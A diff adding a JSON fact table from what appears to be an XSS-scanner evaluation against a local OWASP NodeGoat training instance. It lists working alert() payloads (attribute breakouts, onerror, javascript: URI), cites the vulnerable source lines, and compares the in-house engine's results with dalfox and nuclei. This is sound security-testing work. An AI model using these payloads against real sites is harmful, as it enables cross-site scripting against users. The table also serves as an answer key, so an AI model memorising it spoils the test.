@@ -1,0 +1,184 @@
+{
+  "phase": "392-m3",
+  "tree": "44403a3+395fix",
+  "base": "http://127.0.0.1:20506",
+  "generated": "2026-11-15 02:34:09",
+  "honesty_header": "OWASP NodeGoat master(官方 zip,ghfast 镜像)在 127.0.0.1 运行,官方种子账号(artifacts/db-reset.js),答案键 = 官方源码引用 + 本机 Chromium load 态对话框实测。事实表,不是 F1 跑分;不与 XSSMaze / 194 矩阵 / bWAPP / Juice Shop 并列。",
+  "oracle_rows": [
+    {
+      "id": "V1-lastname-attr-breakout",
+      "page": "/profile",
+      "field": "lastName",
+      "payload_head": "\"><svg onload=alert(841)>",
+      "oracle": "exec",
+      "dialogs": [
+        "841",
+        "841"
+      ],
+      "expect": "exec",
+      "citation": "server.js:135-137 autoescape:false + app/views/profile.html:45 value=\"{{lastName}}\""
+    },
+    {
+      "id": "V2-ssn-attr-breakout",
+      "page": "/profile",
+      "field": "ssn",
+      "payload_head": "\"><svg onload=alert(842)>",
+      "oracle": "exec",
+      "dialogs": [
+        "842"
+      ],
+      "expect": "exec",
+      "citation": "app/views/profile.html:49 value=\"{{ssn}}\" (same autoescape:false)"
+    },
+    {
+      "id": "V3-bankacc-attr-breakout",
+      "page": "/profile",
+      "field": "bankAcc",
+      "payload_head": "\"><svg onload=alert(843)>",
+      "oracle": "exec",
+      "dialogs": [
+        "843"
+      ],
+      "expect": "exec",
+      "citation": "app/views/profile.html:57 value=\"{{bankAcc}}\""
+    },
+    {
+      "id": "V4-address-attr-breakout",
+      "page": "/profile",
+      "field": "address",
+      "payload_head": "\"><svg onload=alert(844)>",
+      "oracle": "exec",
+      "dialogs": [
+        "844"
+      ],
+      "expect": "exec",
+      "citation": "app/views/profile.html:66 value=\"{{address}}\""
+    },
+    {
+      "id": "V5-updateerror-reflection",
+      "page": "(POST response)",
+      "field": "lastName(Reflect)",
+      "payload_head": "\"><svg onload=alert(841)>",
+      "oracle": "exec",
+      "dialogs": [
+        "841",
+        "841"
+      ],
+      "expect": "exec",
+      "citation": "app/routes/profile.js invalid-bankRouting path re-renders user input + app/views/profile.html:24 {{updateError}}; fields re-rendered raw"
+    },
+    {
+      "id": "V6-memos-marked",
+      "page": "/memos",
+      "field": "memo",
+      "payload_head": "<img src=x onerror=alert(846)>",
+      "oracle": "inert",
+      "dialogs": [],
+      "expect": "adjudicate",
+      "citation": "app/views/memos.html {{ marked(doc.memo) }} + server.js:126-129 marked sanitize:true -- survival is measured, not assumed"
+    },
+    {
+      "id": "V7-firstname-href-jsuri",
+      "page": "/profile",
+      "field": "firstName",
+      "payload_head": "javascript:alert(847)",
+      "oracle": "inert",
+      "dialogs": [],
+      "expect": "activation-load-inert",
+      "citation": "app/routes/profile.js:21-25 official FIXME: HTML-encoded in URL context -> javascript: survives; needs click (activation)"
+    }
+  ],
+  "control_rows": [
+    {
+      "id": "ctl-profile-benign",
+      "oracle": "inert",
+      "dialogs": []
+    },
+    {
+      "id": "ctl-memos-benign",
+      "oracle": "inert",
+      "dialogs": []
+    }
+  ],
+  "not_comparable": [
+    "本表不与 XSSMaze(官方靶+官方 scorer,唯一 F1 来源)、194 矩阵、bWAPP、Juice Shop 的任何数字并列;population 只有 7 个投递形状,不构成任何率",
+    "V6 的 marked sanitize 存活与否是测量结论,官方文档自认 sanitize 不充分——不据此宣称 marked 有/无洞",
+    "V7 是 activation 形状(load 态必然 inert),不计入未检出",
+    "第三方工具行是事实表:dalfox/nuclei 拿到的是会话 cookie,不是执行级 oracle,预算也不同(Phase 380 规则)",
+    "本轮向靶场写入 1 条 memo(不可删)+ 多次 profile 覆写,状态已披露"
+  ],
+  "engine": {
+    "rc": 0,
+    "seconds": 6.6,
+    "findings": [
+      {
+        "url": "http://127.0.0.1:20506/profile",
+        "layer": "dom",
+        "severity": "medium",
+        "evidence": ""
+      },
+      {
+        "url": "http://127.0.0.1:20506/profile",
+        "layer": "trusted_types_no_policy",
+        "severity": "medium",
+        "evidence": ""
+      },
+      {
+        "url": "http://127.0.0.1:20506/profile",
+        "layer": "svg_xss_svg_script",
+        "severity": "medium",
+        "evidence": ""
+      },
+      {
+        "url": "http://127.0.0.1:20506/memos",
+        "layer": "dom",
+        "severity": "medium",
+        "evidence": ""
+      },
+      {
+        "url": "http://127.0.0.1:20506/memos",
+        "layer": "trusted_types_no_policy",
+        "severity": "medium",
+        "evidence": ""
+      }
+    ],
+    "stderr_tail": "[*] System temp dir not writable; using C:\\Users\\Administrator\\.cache\\xssentinel\\tmp\n\n[1/2] http://127.0.0.1:20506/profile\n\n[2/2] http://127.0.0.1:20506/memos\n\n[+] Batch complete: 2 target(s) (2 ok, 0 failed), 5 total finding(s).\n"
+  },
+  "tools": {
+    "rows": [
+      {
+        "tool": "dalfox",
+        "page": "/profile",
+        "detected": false,
+        "hits": 0,
+        "seconds": 1.7,
+        "error": ""
+      },
+      {
+        "tool": "dalfox",
+        "page": "/memos",
+        "detected": false,
+        "hits": 0,
+        "seconds": 1.5,
+        "error": ""
+      },
+      {
+        "tool": "nuclei",
+        "page": "/profile",
+        "detected": false,
+        "hits": 0,
+        "seconds": 0.6,
+        "error": ""
+      },
+      {
+        "tool": "nuclei",
+        "page": "/memos",
+        "detected": false,
+        "hits": 0,
+        "seconds": 0.4,
+        "error": ""
+      }
+    ],
+    "note": "FACT TABLE ONLY. No TP/FP/TN/FN or rates (Phase 380 rule): third-party tools got a cookie, not an execution-level oracle, and budgets differ."
+  }
+}
